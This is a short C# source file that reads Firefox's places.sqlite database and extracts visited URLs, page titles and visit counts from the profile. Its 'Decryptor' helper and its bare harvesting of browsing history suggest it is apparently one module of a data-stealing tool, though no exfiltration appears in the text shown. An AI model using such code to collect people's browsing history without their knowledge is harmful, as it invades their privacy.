using System;
using System.Collections.Generic;
using System.IO;

namespace exos.History;

internal class History
{
	public static List<Site> Get(string BrowserDir)
	{
		List<Site> list = new List<Site>();
		string profile = Profile.GetProfile(BrowserDir);
		if (profile == null)
		{
			return list;
		}
		SQLite sQLite = SQLite.ReadTable(Path.Combine(profile, "places.sqlite"), "moz_places");
		if (sQLite == null)
		{
			return list;
		}
		for (int i = 0; i < sQLite.GetRowCount(); i++)
		{
			Site item = default(Site);
			item.sUrl = Decryptor.GetUTF8(sQLite.GetValue(i, 1));
			item.sTitle = Decryptor.GetUTF8(sQLite.GetValue(i, 2));
			item.iCount = Convert.ToInt32(sQLite.GetValue(i, 4)) + 1;
			if (item.sTitle != "0")
			{
				list.Add(item);
			}
		}
		return list;
	}
}
